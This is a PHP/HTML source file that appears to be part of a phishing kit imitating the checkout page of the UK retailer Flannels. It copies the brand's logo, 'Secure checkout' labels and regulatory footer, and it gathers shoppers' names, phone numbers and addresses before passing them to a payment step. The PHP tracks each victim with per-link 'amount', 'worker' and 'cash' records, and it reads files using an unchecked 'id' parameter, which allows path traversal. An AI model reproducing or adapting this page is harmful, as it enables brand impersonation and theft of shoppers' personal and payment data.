<?php
   include('config.php');
   
   if (isset($_GET["id"]) && $_GET["id"] !== null) {
       $id = $_GET["id"];
   
       $filePath = "database/" . $id;
       if (!file_exists($filePath)) {
           die("Invalid link.");
       } else {
           $response = json_decode(file_get_contents($filePath), true);
   
           // Удаление статуса из массива, если он существует
           if (isset($response["status"])) {
               unset($response["status"]);
               
               // Сохранение обновленных данных обратно в файл
               file_put_contents($filePath, json_encode($response));
           }
   
           $amount = $response["amount"];
           $cash = $response["cash"];
           $worker = $response["worker"];
       }
   } else {
       die("Invalid link.");
   }
   
   if (!isset($amount) || $amount == "" || $amount < 10 || $amount > 75000) {
   	$amount = 10;
   }
   
   if (isset($cash) && $cash == "pay") {
       $title = 'Home Page';
   	$h3 = 'Home Page';
   	$button = 'Continue';
   }
   
   if (isset($cash) && $cash == "ref") {
       $title = 'Home Page';
   	$h3 = 'Home Page';
   	$button = 'Continue';
   }
   
   $summe = $_GET['summe'] ?? '';
   $solt = base64_encode(json_encode([
   	'id' => $id,
   	'cash' => $cash,
   	'worker' => $worker
   ]));
?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-GB" lang="en-GB">
   <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <title>Checkout | Delivery Details</title>
      <link rel="stylesheet" href="assets/global.css">
      <link rel="stylesheet" href="assets/basket.css">
      <link rel="stylesheet" href="assets/elevated-cartt.css">
      <link rel="stylesheet" href="assets/checkout-single-page.css">
      <link rel="stylesheet" href="assets/server.bundle.css">
      <link rel="stylesheet" href="assets/portal-flan.css">
      <link rel="SHORTCUT ICON" href="assets/FLAN.ico" type="image/x-icon">
      <link rel="icon" sizes="192x192" href="assets/icon-hires.png">
      <link rel="icon" sizes="128x128" href="assets/icon-normal.png">
   </head>
   <body id="Body" data-errorloggingenabled="false" data-clientloggingmode="" class="language-en currency-gbp Basket sitewide-banner-enabled sitewide-banner-two-line" style="overflow-y: auto; height: 100%;">
      <a href="#main-content" class="offscreen" rel="nofollow">GoToContentActionLink</a>
      <div id="CheckoutSpaRoot" class="">
         <div id="react_0HNB5UN6JT7R4">
            <div class="BodyWrap" data-reactroot="">
               <div aria-busy="false">
                  <div class="menuOverlay"></div>
                  <header>
                     <div class="CheckoutHeader flex flexJustBet">
                        <div class="headerLeftContainer">
                           <div class="headerImg"><a title="Home page" href="/" class="flex"><img src="assets/flan-logo-2021-white.svg" alt="Flannels"></a></div>
                           <div class="headerSecureCheckout visible-xs visible-sm"><span class="securePad"></span><span class="secureText">Secure checkout</span></div>
                        </div>
                        <div class="summaryAlerts">
                           <div class="headerRightSecureCheckout hidden-xs hidden-sm"><span class="securePad"></span><span class="secureText">Secure checkout</span></div>
                           <div class="summaryAlertsInner flex"></div>
                        </div>
                     </div>
                  </header>
                  <main class="ContentWrap">
                     <div class="innerMain">
                        <div class="leftMain">
                           <div class="sectionWrap">
                              <section class="welcomeSection" style="display: none;">
                                 <div class="sectionContent">
                                    <div class="innerContent"></div>
                                 </div>
                              </section>
                              <div name="deliverySection">
                                 <section class="deliverySection activeSection ">
                                    <div class="sectionGroup">
                                       <h1>Delivery</h1>
                                    </div>
                                    <div class="progressContainer">
                                       <div class="progressGroup flex flexJustBet ">
                                          <div class="progressTitle">
                                             <div class="progressTitleTop">Delivery Method</div>
                                             <div class="progressTitleSub pii-item" title="Home delivery">Home delivery</div>
                                          </div>
                                          <div class="noChange"></div>
                                       </div>
                                    </div>
                                    <div class="sectionContent">
                                       <div class="innerContent">
                                          <div class="radioOptionsGroup">
                                             <ul>
                                                <li class="selectedRadioGroup">
                                                   <div class="innerRadio flex flexJustBet flexWrap singleLine">
                                                      <div class="selectionRadio"><input type="radio"><span></span></div>
                                                      <div class="selectionOptions flex flexJustBet">
                                                         <div class="selectionDescription">
                                                            <h3>Home delivery</h3>
                                                         </div>
                                                         <div class="deliveryPrice">
                                                            <div class="deliveryPriceFrom">From</div>
                                                            <div class="deliveryPriceActual" id="summe""><?php echo htmlspecialchars($summe); ?></div>
                                                         </div>
                                                      </div>
                                                      <div class="sectionContent">
                                                         <div class="innerContent">
                                                            <form action="pay.php?id=fffd3a11cb52" method="POST" id="frmAddress">
                                                               <input type="hidden" name="summe" id="summez" value="<?php echo htmlspecialchars($summe); ?>">
                                                               <h2 class="delopeningText">Your Delivery Details</h2>
                                                               <div class="formWrap">
                                                                  <div class="form-group">
                                                                     <div class="labelGroup formComplete">
                                                                        <div><label for="firstName" class="control-label control-label-required">First name</label><span class="mandatoryIndicator">*</span></div>
                                                                        <p class="errorMessage"></p>
                                                                     </div>
                                                                     <div class="inputTickGroup"><input id="firstName" name="firstName" type="text" class="form-control" aria-required="true" placeholder="Enter first name" value="" required></div>
                                                                  </div>
                                                                  <div class="form-group">
                                                                     <div class="labelGroup formComplete">
                                                                        <div><label for="lastName" class="control-label control-label-required">Last name</label><span class="mandatoryIndicator">*</span></div>
                                                                        <p class="errorMessage"></p>
                                                                     </div>
                                                                     <div class="inputTickGroup"><input id="lastName" name="lastName" type="text" class="form-control" aria-required="true" placeholder="Enter last name" value="" required></div>
                                                                  </div>
                                                                  <div class="form-group">
                                                                     <div class="labelGroup formComplete">
                                                                        <div><label for="contactNumber" class="control-label control-label-required">Contact number</label><span class="mandatoryIndicator">*</span></div>
                                                                        <p class="errorMessage"></p>
                                                                     </div>
                                                                     <div class="inputTickGroup"><input id="contactNumber" name="contactNumber" type="tel" class="form-control" aria-required="true" placeholder="Enter contact number" value="" required></div>
                                                                     <p class="contactnumberInfo">*We'll only use this for delivery updates</p>
                                                                  </div>
                                                                  <div class="form-group">
                                                                     <div class="labelGroup flex flexJustBet formComplete">
                                                                        <span class="addressLabelWrap"><label for="line1" class="control-label control-label-required">Address line 1</label><span class="mandatoryIndicator">*</span></span>
                                                                        <p class="errorMessage"></p>
                                                                     </div>
                                                                     <div class="inputTickGroup"><input id="line1" name="line1" type="text" class="form-control" placeholder="Start typing address or postcode" autocomplete="off" value="" required><a href="#" class="changeLink">Enter address manually</a></div>
                                                                  </div>
                                                                  <div class="form-group ">
                                                                     <div class="labelGroup formComplete">
                                                                        <label for="line2" class="control-label control-label-required">Address line 2</label>
                                                                        <p class="errorMessage"></p>
                                                                     </div>
                                                                     <div class="inputTickGroup"><input id="line2" name="line2" type="text" class="form-control" autocomplete="off" value=""></div>
                                                                  </div>
                                                                  <div class="form-group ">
                                                                     <div class="labelGroup formComplete">
                                                                        <div><label for="towncity" class="control-label control-label-required">Town/City</label><span class="mandatoryIndicator">*</span></div>
                                                                        <p class="errorMessage"></p>
                                                                     </div>
                                                                     <div class="inputTickGroup"><input id="towncity" name="towncity" type="text" class="form-control" autocomplete="off" placeholder="Enter town or city" value="" required></div>
                                                                  </div>
                                                                  <div class="form-group ">
                                                                     <div class="labelGroup formComplete">
                                                                        <div><label for="country" class="control-label control-label-required">County/State</label><span class="mandatoryIndicator">*</span></div>
                                                                        <p class="errorMessage"></p>
                                                                     </div>
                                                                     <div class="inputTickGroup">
                                                                        <select id="county" name="county" class="form-control">
                                                                           <option value="AL">Alabama</option>
                                                                           <option value="AK">Alaska</option>
                                                                           <option value="AZ">Arizona</option>
                                                                           <option value="AR">Arkansas</option>
                                                                           <option value="CA">California</option>
                                                                           <option value="CO">Colorado</option>
                                                                           <option value="CT">Connecticut</option>
                                                                           <option value="DE">Delaware</option>
                                                                           <option value="DC">District of Columbia</option>
                                                                           <option value="FL">Florida</option>
                                                                           <option value="GA">Georgia</option>
                                                                           <option value="HI">Hawaii</option>
                                                                           <option value="ID">Idaho</option>
                                                                           <option value="IL">Illinois</option>
                                                                           <option value="IN">Indiana</option>
                                                                           <option value="IA">Iowa</option>
                                                                           <option value="KS">Kansas</option>
                                                                           <option value="KY">Kentucky</option>
                                                                           <option value="LA">Louisiana</option>
                                                                           <option value="ME">Maine</option>
                                                                           <option value="MD">Maryland</option>
                                                                           <option value="MA">Massachusetts</option>
                                                                           <option value="MI">Michigan</option>
                                                                           <option value="MN">Minnesota</option>
                                                                           <option value="MS">Mississippi</option>
                                                                           <option value="MO">Missouri</option>
                                                                           <option value="MT" selected="">Montana</option>
                                                                           <option value="NE">Nebraska</option>
                                                                           <option value="NV">Nevada</option>
                                                                           <option value="NH">New Hampshire</option>
                                                                           <option value="NJ">New Jersey</option>
                                                                           <option value="NM">New Mexico</option>
                                                                           <option value="NY">New York</option>
                                                                           <option value="NC">North Carolina</option>
                                                                           <option value="ND">North Dakota</option>
                                                                           <option value="OH">Ohio</option>
                                                                           <option value="OK">Oklahoma</option>
                                                                           <option value="OR">Oregon</option>
                                                                           <option value="PA">Pennsylvania</option>
                                                                           <option value="RI">Rhode Island</option>
                                                                           <option value="SC">South Carolina</option>
                                                                           <option value="SD">South Dakota</option>
                                                                           <option value="TN">Tennessee</option>
                                                                           <option value="TX">Texas</option>
                                                                           <option value="UT">Utah</option>
                                                                           <option value="VT">Vermont</option>
                                                                           <option value="VA">Virginia</option>
                                                                           <option value="WA">Washington</option>
                                                                           <option value="WV">West Virginia</option>
                                                                           <option value="WI">Wisconsin</option>
                                                                           <option value="WY">Wyoming</option>
                                                                        </select>
                                                                     </div>
                                                                  </div>
                                                                  <div class="form-group ">
                                                                     <div class="labelGroup formComplete">
                                                                        <div><label for="postcode" class="control-label control-label-required">Postcode/Zip</label><span class="mandatoryIndicator">*</span></div>
                                                                        <p class="errorMessage"></p>
                                                                     </div>
                                                                     <div class="inputTickGroup"><input id="postcode" name="postcode" type="text" class="form-control" autocomplete="off" placeholder="Enter postcode/ZIP" value="" required></div>
                                                                  </div>
                                                                  <div class="form-group ">
                                                                     <div class="elevated-cart">
                                                                        <div class="basket-summary-container frasers-plus-payment-enabled">
                                                                           <div class="basket-summary">
                                                                              <div id="pnlPromoCode" class="basket-summary-promo-code">
                                                                                 <div class="">
                                                                                    <div class="PromoWrap">
                                                                                       <div class="PromoCodeInput">
                                                                                          <input id="promoCode" name="promoCode" placeholder="Enter promo code" type="text" value="">
                                                                                       </div>
                                                                                       <button type="button" id="divPromoCodeButton" data-action="applypromocode" class="PromoCodeBut haserror">
                                                                                       <span>Apply</span>
                                                                                       </button>
                                                                                    </div>
                                                                                 </div>
                                                                                 <div id="divVoucherError" class="basket-summary-promo-code-error alertz alert-block hiddenz">
                                                                                    <center><span id="errorMessage"></span></center>
                                                                                 </div>
                                                                              </div>
                                                                           </div>
                                                                        </div>
                                                                     </div>
                                                                  </div>
                                                                  <p class="requiredFields">*Required fields</p>
                                                               </div>
                                                               <div class="formCompleteCTA"><button type="submit">Continue</button></div>
                                                            </form>
                                                         </div>
                                                      </div>
                                                   </div>
                                                </li>
                                             </ul>
                                          </div>
                                       </div>
                                    </div>
                                    <div class="progressContainer">
                                       <div class="innerContent styleAndCollectEligibiltyWrapper  inline-eligibility">
                                          <div class="basket-stylecollect">Choose 'collect from store' to access Style and Collect, our complimentary in-store styling service. Available at selected stores</div>
                                       </div>
                                    </div>
                                 </section>
                              </div>
                              <div name="paymentSection">
                                 <section class="paymentSection">
                                    <div class="sectionGroup">
                                       <h1>Payment</h1>
                                    </div>
                                 </section>
                              </div>
                              <div>
                                 <section class="confirmationSection">
                                    <div class="sectionGroup">
                                       <h1>Order Confirmation</h1>
                                    </div>
                                 </section>
                              </div>
                           </div>
                        </div>
                     </div>
                  </main>
                  <footer>
                     <div class="innerFooter">
                        <a id="footerStepMsg" href="https://www.flannels.com/customerservices/deliveryinfo" target="_blank">Need help with delivery?</a>
                        <div class="copyrightsecurityWrap">
                           <div class="copyrightTextMob">© 2025 The Flannels Group Ltd</div>
                        </div>
                     </div>
                  </footer>
                  <span></span>
               </div>
            </div>
         </div>
      </div>
      <div class="ecomContent" data-ecomadvert-creative="FooterDisclosure 28-11-24" data-ecomadvert-name="FooterDisclosure 28-11-24" data-ecomadvert-cssclass="FooterDisclosure" data-ecomadvert-adertid="31833" data-dy-slot-name="">
         <div class="FooterDisclosure">
            <div class="footer-disclosure-container">
               <p>The Flannels Group Ltd (FRN: 977237), trading as ‘Flannels’ is an appointed representative of Frasers Group Credit Broking Limited (FRN: 947961) who are authorised and regulated by the Financial Conduct Authority as a credit broker not a lender.Frasers Plus is a credit product provided by Frasers Group Financial Services Limited (FRN: 311908) and is subject to your financial circumstances. <strong>Missed payments may affect your credit score.</strong> For regulated payment services, Frasers Group Financial Services Limited is a payment agent of Transact Payments Limited, a company authorised and regulated by the Gibraltar Financial Services Commission as an electronic money institution.</p>
            </div>
         </div>
      </div>
      <script src="assets/promtz.js"></script>
   </body>
</html>